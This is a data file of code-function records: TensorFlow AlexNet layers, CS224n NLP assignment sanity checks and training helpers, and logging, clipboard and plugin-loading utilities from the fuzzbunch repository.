conv = tf.nn.conv2d(pool2, kernel, [1, 1, 1, 1], padding='SAME')\n  biases = tf.Variable(tf.constant(0.0, shape=[384], dtype=tf.float32),\n                       trainable=True, name='biases')\n  bias = tf.nn.bias_add(conv, biases)\n  conv3 = tf.nn.relu(bias, name=scope)\n  parameters += [kernel, biases]\n  print_activations(conv3)\n\n# conv4\nwith tf.name_scope('conv4') as scope:\n  kernel = tf.Variable(tf.truncated_normal([3, 3, 384, 256],\n                                           dtype=tf.float32,\n                                           stddev=1e-1), name='weights')\n  conv = tf.nn.conv2d(conv3, kernel, [1, 1, 1, 1], padding='SAME')\n  biases = tf.Variable(tf.constant(0.0, shape=[256], dtype=tf.float32),\n                       trainable=True, name='biases')\n  bias = tf.nn.bias_add(conv, biases)\n  conv4 = tf.nn.relu(bias, name=scope)\n  parameters += [kernel, biases]\n  print_activations(conv4)\n\n# conv5\nwith tf.name_scope('conv5') as scope:\n  kernel = tf.Variable(tf.truncated_normal([3, 3, 256, 256],\n                                           dtype=tf.float32,\n                                           stddev=1e-1), name='weights')\n  conv = tf.nn.conv2d(conv4, kernel, [1, 1, 1, 1], padding='SAME')\n  biases = tf.Variable(tf.constant(0.0, shape=[256], dtype=tf.float32),\n                       trainable=True, name='biases')\n  bias = tf.nn.bias_add(conv, biases)\n  conv5 = tf.nn.relu(bias, name=scope)\n  parameters += [kernel, biases]\n  print_activations(conv5)\n\n# pool5\npool5 = tf.nn.max_pool(conv5,\n                       ksize=[1, 3, 3, 1],\n                       strides=[1, 2, 2, 1],\n                       padding='VALID',\n                       name='pool5')\nprint_activations(pool5)\n\nreturn pool5, parameters", "path": "3.image_classification\\alexnet_tf.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "''' Reports this tool was closed. '''\n", "func_signal": "def close(self, command_line=None, results=None, status=None, success=None, **params):\n", "code": "self.running = False\nself('tool closed', command_line=command_line, command_results=results, command_status=status, command_success=success, command_uuid=uuid() if command_line else None, **params)", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "'''Paste windows clipboard'''\n", "func_signal": "def paste(self,e):\n", "code": "if self.enable_win32_clipboard:\n        txt=clipboard.get_clipboard_text_and_convert(False)\n        self.insert_text(txt)", "path": "fuzzbunch\\pyreadline\\modes\\notemacs.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "''' Upload a file given an open file descriptor to a local path.  Returns event_uuid. '''\n", "func_signal": "def file_from_file(self, fd, parent_uuid=None, **params):\n", "code": "try: # if isinstance(fd,file)...\n    fd.flush()\n    return self.file_from_path(fd.name, parent_uuid, **params)\nexcept:\n    self.notify_of_error('Could not access file descriptor for '+str(fd))\n    return None", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "'''setup the mapping from key to call the function.'''\n", "func_signal": "def _bind_exit_key(self, key):\n", "code": "keyinfo = make_KeyPress_from_keydescr(key.lower()).tuple()\nself.exit_dispatch[keyinfo] = None", "path": "fuzzbunch\\pyreadline\\modes\\basemode.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "''' Queue any number of params for next call.  Returns log. '''\n", "func_signal": "def queue(self, **params):\n", "code": "try:\n    for key in params: self.__queue[key] = deepcopy(params[key])\nexcept:\n    self.notify_of_error(\"Could not set queue by dictionary.  Parameters were:\\n\"+str(params))\nreturn self", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "'''Paste windows clipboard'''\n", "func_signal": "def paste_mulitline_code(self,e):\n", "code": "reg=re.compile(\"\\r?\\n\")\nif self.enable_win32_clipboard:\n        txt=clipboard.get_clipboard_text_and_convert(False)\n        t=reg.split(txt)\n        t=[row for row in t if row.strip()!=\"\"] #remove empty lines\n        if t!=[\"\"]:\n            self.insert_text(t[0])\n            self.add_history(self.l_buffer.copy())\n            self.paste_line_buffer=t[1:]\n            log(\"multi: %s\"%self.paste_line_buffer)\n            return True\n        else:\n            return False", "path": "fuzzbunch\\pyreadline\\modes\\notemacs.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "''' Close a local socket and any open connections. '''\n", "func_signal": "def socket_closed(self, port, ip='0.0.0.0', project=None, is_tcp=None, is_udp=None, is_raw=None, **params):\n", "code": "if is_raw or is_tcp or is_udp: return self(event_type='socket closed', socket_port=port, socket_ip=ip, socket_project=project, socket_is_raw=is_raw, socket_is_tcp=is_tcp, socket_is_udp=is_udp, **params)\nelse: self.notify_of_error('Could not close socket.  No socket type specified.')", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "'''Paste windows clipboard. If enable_ipython_paste_list_of_lists is \nTrue then try to convert tabseparated data to repr of list of lists or \nrepr of array.\nIf enable_ipython_paste_for_paths==True then change \\\\ to / and spaces to \\space'''\n", "func_signal": "def ipython_paste(self,e):\n", "code": "if self.enable_win32_clipboard:\n        txt=clipboard.get_clipboard_text_and_convert(\n                                        self.enable_ipython_paste_list_of_lists)\n        if self.enable_ipython_paste_for_paths:\n                if len(txt)<300 and (\"\\t\" not in txt) and (\"\\n\" not in txt):\n                        txt=txt.replace(\"\\\\\",\"/\").replace(\" \",r\"\\ \")\n        self.insert_text(txt)", "path": "fuzzbunch\\pyreadline\\modes\\basemode.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "# Assertion from the original code\n", "func_signal": "def __init__(self, group=None, target=None, name=None, args=(), kwargs={}, _dsz_newterm=None):\n", "code": "assert group is None, 'group argument must be None for now'\n\ncount = _current_process._counter.next()\n\nself._identity   = _current_process._identity + (count,)\nself._authkey    = _current_process._authkey\nself._daemonic   = _current_process._daemonic\nself._tempdir    = _current_process._tempdir\n# Analog: parent \"pid\" is the command ID of the parent script\nself._parent_pid = _DSZ_COMMAND_ID\nself._popen      = None\nself._target     = target\nself._args       = args\nself._kwargs     = kwargs\nself._name       = name or type(self).__name__ + '-' + ':'.join(str(i) for i in self._identity)", "path": "Resources\\Python\\Override\\Lib\\multiprocessing\\process.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "''' Open a local RAW/UDP or TCP LISTENing socket. '''\n", "func_signal": "def socket_opened(self, port, ip='0.0.0.0', project=None, is_tcp=None, is_udp=None, is_raw=None, **params):\n", "code": "if is_raw or is_tcp or is_udp: return self(event_type='socket opened', socket_port=port, socket_ip=ip, socket_project=project, socket_is_raw=is_raw, socket_is_tcp=is_tcp, socket_is_udp=is_udp, **params)\nelse: self.notify_of_error('Could not open socket.  No socket type specified.')", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "\"\"\"\n@brief Enumerate available plugins and add them to the fuzzbunch pluginmanager\n\n@param fb           Fuzzbunch object\n@param type         String with the type of plugin to add (Exploit, Payload,  Touch, etc...)\n@param location     The disk location to look for that type of plugin\n@param constructor  Constructor to use to instantiate the plugin\n\"\"\"\n# Get a list of tuples for the available plugins in 'location'\n# Each entry will be (config, executable, fbfile)\n\n#\n# XXX Should we ensure the directories exist and load nothing, or \n# fail, in the event the directory doesn't exist already.\n#\n", "func_signal": "def addplugins(fb, type, location, constructor, manager=pluginmanager.PluginManager, bin=True):\n", "code": "plugins = getpluginlist(location, bin)\nmanager = fb.register_manager(type, manager)\n\nfor plugin in plugins:\n    try:\n        manager.add_plugin(plugin, constructor)\n    except exception.PluginXmlErr:\n        # We encountered an error in the plugin's XML file.  We don't want\n        # this to kill execution of Fuzzbunch\n        import os.path\n        (d,f) = os.path.split(plugin[0])\n        n = f.split('-')[0]\n        fb.io.pre_input(None)\n        fb.io.print_warning(\"Failed to load %s - XML Error\" % (str(n)))\n        fb.io.post_input()", "path": "fuzzbunch\\pluginfinder.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "# Verify [ .. ] and remove\n", "func_signal": "def _tokenize_barelist(self, l):\n", "code": "if l[0] != '[' or l[-1] != ']':\n    return None\nl = l[1:-1]\n\n# tokens are token, token, ..., token\n# Non-quoted strings with comma and (optional) whitespace delimiters\nreturn [x.strip() for x in l.split(',')]", "path": "fuzzbunch\\truantchild.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "# Verify [ .. ] and remove\n", "func_signal": "def _tokenize_list(self, l):\n", "code": "if l[0] != '[' or l[-1] != ']':\n    return None\nl = l[1:-1]\n\n# tokens are 'token',  \"token\", ...\n# quoted strings with comma and (optional) whitespace delimiters\ntokens = []\nwhile l:\n    if l[0] not in \"'\\\"\":\n        if l[0] in (' ', ','):\n            l = l[1:]\n            continue\n        else:\n            return None\n    else:\n        delim = l[0]\n        l = l[1:]\n    try:\n        pos = l.index(delim)\n    except ValueError:\n        return None\n    tokens.append(l[:pos])\n    l = l[pos+1:]\nreturn tokens", "path": "fuzzbunch\\truantchild.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "'''Paste windows clipboard as multiline code.\nRemoves any empty lines in the code'''\n", "func_signal": "def paste_mulitline_code(self,e):\n", "code": "reg=re.compile(\"\\r?\\n\")\nif self.enable_win32_clipboard:\n        txt=clipboard.get_clipboard_text_and_convert(False)\n        t=reg.split(txt)\n        t=[row for row in t if row.strip()!=\"\"] #remove empty lines\n        if t!=[\"\"]:\n            self.insert_text(t[0])\n            self.add_history(self.l_buffer.copy())\n            self.paste_line_buffer=t[1:]\n            log(\"multi: %s\"%self.paste_line_buffer)\n            return True\n        else:\n            return False", "path": "fuzzbunch\\pyreadline\\modes\\basemode.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "'''Paste windows clipboard. If enable_ipython_paste_list_of_lists is \nTrue then try to convert tabseparated data to repr of list of lists or \nrepr of array'''\n", "func_signal": "def ipython_paste(self,e):\n", "code": "if self.enable_win32_clipboard:\n        txt=clipboard.get_clipboard_text_and_convert(\n                                        self.enable_ipython_paste_list_of_lists)\n        if self.enable_ipython_paste_for_paths:\n                if len(txt)<300 and (\"\\t\" not in txt) and (\"\\n\" not in txt):\n                        txt=txt.replace(\"\\\\\",\"/\").replace(\" \",r\"\\ \")\n        self.insert_text(txt)", "path": "fuzzbunch\\pyreadline\\modes\\notemacs.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "\"\"\"@brief   Get a list of available plugins from a given directory\n\n@param  location        Directory to search for plugins\n@param  bin             Is what we're trying to load binary?\n\"\"\"\n", "func_signal": "def getpluginlist(location, bin):\n", "code": "fblist     = getextensionfiles(location, FB_CONFIG_EXT)         # get list of .fb files\nconfiglist = getextensionfiles(location, PLUGIN_CONFIG_EXT)     # get list of .xml files\ndirlist    = os.listdir(location)\npluginlist = []\n\nfor config in configlist:\n    base    = \".\".join(config.split(\".\")[:-2])\n\n    # Try to find a corresponding .fb file for each .xml file\n    fbindex = configlistsearch(fblist, base)\n    if fbindex is not None:\n        if bin:\n            for ext in BINARY_EXT:\n                if base + ext in dirlist:\n                    # Add a tuple containing (config, executable, fbfile) to pluginlist\n                    pluginlist.append((os.path.join(location, config),\n                                       os.path.join(location, base + ext),\n                                       os.path.join(location, fblist[fbindex])))\n        else:\n            # Cover the case in which we don't have an executable file \n            pluginlist.append((os.path.join(location, config),\n                               \"noFile\",\n                               os.path.join(location, fblist[fbindex])))\nreturn pluginlist", "path": "fuzzbunch\\pluginfinder.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "''' Upload a file given its content.  Returns event_uuid. '''\n", "func_signal": "def file_from_content(self, content, storage_name, parent_uuid=None, **params):\n", "code": "try:\n    storage_name = storage_name or \"%s.txt\"%(uuid())\n    full_path = self.basefilename()+'.'+storage_name\n    with open(full_path, 'wb') as f:\n        f.write(content.encode('utf-8'))\nexcept: self.notify_of_error('Could not write file ' + full_path)\nelse: return self('remote file', parent_uuid, file_origin_name=storage_name, file_origin_path=None, file_origin_created=datetime.utcfromtimestamp(os.path.getctime(full_path)).isoformat(' '), **params)\nreturn None", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "''' Set the value of params for all future calls.  Returns log. '''\n", "func_signal": "def set(self, **params):\n", "code": "try:\n    for key in params: self.__params[key] = deepcopy(params[key])\nexcept:\n    self.notify_of_error(\"Could not set params.  Parameters were:\\n\"+str(params))\nreturn self", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "#if not self.isHidden():\n", "func_signal": "def getParameterListExt(self):\n", "code": "return [oParam(self.getName(), self.getValue(), \n            self.getType(), self.getFormat())]\n#else:\n#    return []", "path": "fuzzbunch\\truantchild.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "''' Upload a file given its local path.  Returns event_uuid. '''\n", "func_signal": "def file_from_path(self, full_path, parent_uuid=None, **params):\n", "code": "try:\n    full_path = os.path.realpath(os.path.normpath(full_path))\n    (file_path, file_name) = os.path.split(full_path)\n    shutil.copyfile(full_path, self.basefilename()+'.'+file_name)\nexcept: self.notify_of_error('Could not access file ' + full_path)\nelse: return self('remote file', parent_uuid, file_origin_name=file_name, file_origin_path=file_path, file_origin_created=datetime.utcfromtimestamp(os.path.getctime(full_path)).isoformat(' '), **params)\nreturn None", "path": "fuzzbunch\\log.py", "repo_name": "fuzzbunch/fuzzbunch", "stars": 945, "license": "None", "language": "python", "size": 133023}
{"docstring": "\"\"\" Sanity check for CharDecoder.train_forward()\n    basic shape check\n\"\"\"\n", "func_signal": "def question_2c_sanity_check(decoder):\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 2c: CharDecoder.train_forward()\")\nprint(\"-\" * 80)\nsequence_length = 4\ninpt = torch.zeros(sequence_length, BATCH_SIZE, dtype=torch.long)\nloss = decoder.train_forward(inpt)\nassert (list(loss.size()) == []\n        ), \"Loss should be a scalar but its shape is: {}\".format(\n            list(loss.size()))\nprint(\"Sanity Check Passed for Question 2c: CharDecoder.train_forward()!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Load vocabulary from JSON dump.\n@param file_path (str): file path to vocab file\n@returns Vocab object loaded from JSON dump\n\"\"\"\n", "func_signal": "def load(file_path):\n", "code": "entry = json.load(open(file_path, 'r'))\nsrc_word2id = entry['src_word2id']\ntgt_word2id = entry['tgt_word2id']\n\nreturn Vocab(VocabEntry(src_word2id), VocabEntry(tgt_word2id))", "path": "assignments\\a4\\vocab.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Main func.\n\"\"\"\n", "func_signal": "def main():\n", "code": "args = docopt(__doc__)\n\n# Check pytorch version\nassert(torch.__version__ >= \"1.0.0\"), \"Please update your installation of PyTorch. You have {} and you should have version 1.0.0\".format(torch.__version__)\n\n# seed the random number generators\nseed = int(args['--seed'])\ntorch.manual_seed(seed)\nif args['--cuda']:\n    torch.cuda.manual_seed(seed)\nnp.random.seed(seed * 13 // 7)\n\nif args['train']:\n    train(args)\nelif args['decode']:\n    decode(args)\nelse:\n    raise RuntimeError('invalid run mode')", "path": "assignments\\a5\\run.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Train the neural dependency parser.\n\n@param parser (Parser): Neural Dependency Parser\n@param train_data ():\n@param dev_data ():\n@param output_path (str): Path to which model weights and results are written.\n@param batch_size (int): Number of examples in a single batch\n@param n_epochs (int): Number of training epochs\n@param lr (float): Learning rate\n\"\"\"\n", "func_signal": "def train(parser, train_data, dev_data, output_path, batch_size=1024, n_epochs=10, lr=0.0005):\n", "code": "best_dev_UAS = 0\n\n\n### YOUR CODE HERE (~2-7 lines)\n### TODO:\n###      1) Construct Adam Optimizer in variable `optimizer`\n###      2) Construct the Cross Entropy Loss Function in variable `loss_func`\n###\n### Hint: Use `parser.model.parameters()` to pass optimizer\n###       necessary parameters to tune.\n### Please see the following docs for support:\n###     Adam Optimizer: https://pytorch.org/docs/stable/optim.html\n###     Cross Entropy Loss:     \noptimizer = optim.Adam(parser.model.parameters())\nloss_func = nn.CrossEntropyLoss()\n\n\n### END YOUR CODE\n\nfor epoch in range(n_epochs):\n    print(\"Epoch {:} out of {:}\".format(epoch + 1, n_epochs))\n    dev_UAS = train_for_epoch(parser, train_data, dev_data, optimizer, loss_func, batch_size)\n    if dev_UAS > best_dev_UAS:\n        best_dev_UAS = dev_UAS\n        print(\"New best dev UAS! Saving model.\")\n        torch.save(parser.model.state_dict(), output_path)\n    print(\"\")", "path": "assignments\\a3\\run.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Evaluate perplexity on dev sentences\n@param model (NMT): NMT Model\n@param dev_data (list of (src_sent, tgt_sent)): list of tuples containing source and target sentence\n@param batch_size (batch size)\n@returns ppl (perplixty on dev sentences)\n\"\"\"\n", "func_signal": "def evaluate_ppl(model, dev_data, batch_size=32):\n", "code": "was_training = model.training\nmodel.eval()\n\ncum_loss = 0.\ncum_tgt_words = 0.\n\n# no_grad() signals backend to throw away all gradients\nwith torch.no_grad():\n    for src_sents, tgt_sents in batch_iter(dev_data, batch_size):\n        loss = -model(src_sents, tgt_sents).sum()\n\n        cum_loss += loss.item()\n        tgt_word_num_to_predict = sum(len(s[1:]) for s in tgt_sents)  # omitting leading `<s>`\n        cum_tgt_words += tgt_word_num_to_predict\n\n    ppl = np.exp(cum_loss / cum_tgt_words)\n\nif was_training:\n    model.train()\n\nreturn ppl", "path": "assignments\\a5\\run.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Sanity check for pad_sents_char() function. \n\"\"\"\n", "func_signal": "def question_1f_sanity_check():\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 1f: Padding\")\nprint(\"-\" * 80)\nvocab = VocabEntry()\n\nprint(\"Running test on a list of sentences\")\nsentences = [['Human:', 'What', 'do', 'we', 'want?'],\n             ['Computer:', 'Natural', 'language', 'processing!'],\n             ['Human:', 'When', 'do', 'we', 'want', 'it?'],\n             ['Computer:', 'When', 'do', 'we', 'want', 'what?']]\nword_ids = vocab.words2charindices(sentences)\n\npadded_sentences = pad_sents_char(word_ids, 0)\ngold_padded_sentences = torch.load(\n    './sanity_check_en_es_data/gold_padded_sentences.pkl')\nassert padded_sentences == gold_padded_sentences, \"Sentence padding is incorrect: it should be:\\n {} but is:\\n{}\".format(\n    gold_padded_sentences, padded_sentences)\n\nprint(\"Sanity Check Passed for Question 1f: Padding!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Main func.\n\"\"\"\n", "func_signal": "def main():\n", "code": "args = docopt(__doc__)\n\n# Check Python & PyTorch Versions\nassert (sys.version_info >=\n        (3,\n         5)), \"Please update your installation of Python to version >= 3.5\"\nassert (\n    torch.__version__ >= \"1.0.1\"\n), \"Please update your installation of PyTorch. You have {} and you should have version 1.0.0\".format(\n    torch.__version__)\n\n# Seed the Random Number Generators\nseed = 1234\ntorch.manual_seed(seed)\ntorch.cuda.manual_seed(seed)\nnp.random.seed(seed * 13 // 7)\n\nvocab = Vocab.load('./sanity_check_en_es_data/vocab_sanity_check.json')\n\n# Create NMT Model\nmodel = NMT(embed_size=EMBED_SIZE,\n            hidden_size=HIDDEN_SIZE,\n            dropout_rate=DROPOUT_RATE,\n            vocab=vocab)\n\nchar_vocab = DummyVocab()\n\n# Initialize CharDecoder\ndecoder = CharDecoder(hidden_size=HIDDEN_SIZE,\n                      char_embedding_size=EMBED_SIZE,\n                      target_vocab=char_vocab)\n\nif args['1e']:\n    question_1e_sanity_check()\nelif args['1f']:\n    question_1f_sanity_check()\nelif args['1h']:\n    question_1h_sanity_check()\nelif args['1j']:\n    question_1j_sanity_check(model)\nelif args['2a']:\n    question_2a_sanity_check(decoder, char_vocab)\nelif args['2b']:\n    question_2b_sanity_check(decoder, char_vocab)\nelif args['2c']:\n    question_2c_sanity_check(decoder)\nelif args['2d']:\n    question_2d_sanity_check(decoder)\nelse:\n    raise RuntimeError('invalid run mode')", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Sanity check for CharDecoder.forward()\n    basic shape check\n\"\"\"\n", "func_signal": "def question_2b_sanity_check(decoder, char_vocab):\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 2b: CharDecoder.forward()\")\nprint(\"-\" * 80)\nsequence_length = 4\ninpt = torch.zeros(sequence_length, BATCH_SIZE, dtype=torch.long)\nlogits, (dec_hidden1, dec_hidden2) = decoder.forward(inpt)\nlogits_expected_size = [\n    sequence_length, BATCH_SIZE,\n    len(char_vocab.char2id)\n]\ndec_hidden_expected_size = [1, BATCH_SIZE, HIDDEN_SIZE]\nassert (\n    list(logits.size()) == logits_expected_size\n), \"Logits shape is incorrect:\\n it should be {} but is:\\n{}\".format(\n    logits_expected_size, list(logits.size()))\nassert (\n    list(dec_hidden1.size()) == dec_hidden_expected_size\n), \"Decoder hidden state shape is incorrect:\\n it should be {} but is: {}\".format(\n    dec_hidden_expected_size, list(dec_hidden1.size()))\nassert (\n    list(dec_hidden2.size()) == dec_hidden_expected_size\n), \"Decoder hidden state shape is incorrect:\\n it should be {} but is: {}\".format(\n    dec_hidden_expected_size, list(dec_hidden2.size()))\nprint(\"Sanity Check Passed for Question 2b: CharDecoder.forward()!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Convert list of words or list of sentences of words\ninto list or list of list of indices.\n@param sents (list[str] or list[list[str]]): sentence(s) in words\n@return word_ids (list[int] or list[list[int]]): sentence(s) in indices\n\"\"\"\n", "func_signal": "def words2indices(self, sents):\n", "code": "if type(sents[0]) == list:\n    return [[self[w] for w in s] for s in sents]\nelse:\n    return [self[w] for w in sents]", "path": "assignments\\a4\\vocab.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Sanity check for highway.py\n    basic shape check\n\"\"\"\n\n", "func_signal": "def question_1h_sanity_check():\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 1h: Highway\")\nprint(\"-\" * 80)\n\nX_conv_out = torch.randn((5, 4, 3))\nhighway = Highway(X_conv_out.size(-1))\nX_highway = highway(X_conv_out)\nassert X_conv_out.size() == X_highway.size(\n), \"Output size should be: {}\\n but is {}\\n\".format(X_conv_out.size(), X_highway.size())\n\nprint(\"Shape is right!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Sanity check for words2charindices function. \n\"\"\"\n", "func_signal": "def question_1e_sanity_check():\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 1e: words2charindices()\")\nprint(\"-\" * 80)\nvocab = VocabEntry()\n\nprint('Running test on small list of sentences')\nsentences = [[\"a\", \"b\", \"c?\"], [\"~d~\", \"c\", \"b\", \"a\"]]\nsmall_ind = vocab.words2charindices(sentences)\nsmall_ind_gold = [[[1, 30, 2], [1, 31, 2], [1, 32, 70, 2]],\n                  [[1, 85, 33, 85, 2], [1, 32, 2], [1, 31, 2], [1, 30, 2]]]\nassert(small_ind == small_ind_gold), \\\n    \"small test resulted in indices list {:}, expected {:}\".format(small_ind, small_ind_gold)\n\nprint('Running test on large list of sentences')\ntgt_sents = [[\n    '<s>', \"Let's\", 'start', 'by', 'thinking', 'about', 'the', 'member',\n    'countries', 'of', 'the', 'OECD,', 'or', 'the', 'Organization', 'of',\n    'Economic', 'Cooperation', 'and', 'Development.', '</s>'\n],\n             [\n                 '<s>', 'In', 'the', 'case', 'of', 'gun', 'control,', 'we',\n                 'really', 'underestimated', 'our', 'opponents.', '</s>'\n             ],\n             [\n                 '<s>', 'Let', 'me', 'share', 'with', 'those', 'of', 'you',\n                 'here', 'in', 'the', 'first', 'row.', '</s>'\n             ],\n             [\n                 '<s>', 'It', 'suggests', 'that', 'we', 'care', 'about',\n                 'the', 'fight,', 'about', 'the', 'challenge.', '</s>'\n             ],\n             [\n                 '<s>', 'A', 'lot', 'of', 'numbers', 'there.', 'A', 'lot',\n                 'of', 'numbers.', '</s>'\n             ]]\ntgt_ind = vocab.words2charindices(tgt_sents)\ntgt_ind_gold = pickle.load(\n    open('./sanity_check_en_es_data/1e_tgt.pkl', 'rb'))\nassert (\n    tgt_ind == tgt_ind_gold\n), \"target vocab test resulted in indices list {:}, expected {:}\".format(\n    tgt_ind, tgt_ind_gold)\n\nprint(\"All Sanity Checks Passed for Question 1e: words2charindices()!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Sanity check for model_embeddings.py \n\t\tbasic shape check\n\t\"\"\"\n", "func_signal": "def question_1j_sanity_check(model):\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 1j: Model Embedding\")\nprint(\"-\" * 80)\nsentence_length = 10\nmax_word_length = 21\ninpt = torch.zeros(sentence_length,\n                   BATCH_SIZE,\n                   max_word_length,\n                   dtype=torch.long)\nME_source = model.model_embeddings_source\noutput = ME_source.forward(inpt)\noutput_expected_size = [sentence_length, BATCH_SIZE, EMBED_SIZE]\nassert (\n    list(output.size()) == output_expected_size\n), \"output shape is incorrect: it should be:\\n {} but is:\\n{}\".format(\n    output_expected_size, list(output.size()))\nprint(\"Sanity Check Passed for Question 1j: Model Embedding!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Add word to VocabEntry, if it is previously unseen.\n@param word (str): word to add to VocabEntry\n@return index (int): index that the word has been assigned\n\"\"\"\n", "func_signal": "def add(self, word):\n", "code": "if word not in self:\n    wid = self.word2id[word] = len(self)\n    self.id2word[wid] = word\n    return wid\nelse:\n    return self[word]", "path": "assignments\\a4\\vocab.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
{"docstring": "\"\"\" Sanity check for CharDecoder.__init__()\n    basic shape check\n\"\"\"\n", "func_signal": "def question_2a_sanity_check(decoder, char_vocab):\n", "code": "print(\"-\" * 80)\nprint(\"Running Sanity Check for Question 2a: CharDecoder.__init__()\")\nprint(\"-\" * 80)\nassert (\n    decoder.charDecoder.input_size == EMBED_SIZE\n), \"Input dimension is incorrect:\\n it should be {} but is: {}\".format(\n    EMBED_SIZE, decoder.charDecoder.input_size)\nassert (\n    decoder.charDecoder.hidden_size == HIDDEN_SIZE\n), \"Hidden dimension is incorrect:\\n it should be {} but is: {}\".format(\n    HIDDEN_SIZE, decoder.charDecoder.hidden_size)\nassert (\n    decoder.char_output_projection.in_features == HIDDEN_SIZE\n), \"Input dimension is incorrect:\\n it should be {} but is: {}\".format(\n    HIDDEN_SIZE, decoder.char_output_projection.in_features)\nassert (\n    decoder.char_output_projection.out_features == len(char_vocab.char2id)\n), \"Output dimension is incorrect:\\n it should be {} but is: {}\".format(\n    len(char_vocab.char2id), decoder.char_output_projection.out_features)\nassert (\n    decoder.decoderCharEmb.num_embeddings == len(char_vocab.char2id)\n), \"Number of embeddings is incorrect:\\n it should be {} but is: {}\".format(\n    len(char_vocab.char2id), decoder.decoderCharEmb.num_embeddings)\nassert (\n    decoder.decoderCharEmb.embedding_dim == EMBED_SIZE\n), \"Embedding dimension is incorrect:\\n it should be {} but is: {}\".format(\n    EMBED_SIZE, decoder.decoderCharEmb.embedding_dim)\nprint(\"Sanity Check Passed for Question 2a: CharDecoder.__init__()!\")\nprint(\"-\" * 80)", "path": "assignments\\a5\\sanity_check.py", "repo_name": "ZacBi/CS224n-2019-solutions", "stars": 529, "license": "None", "language": "python", "size": 374}
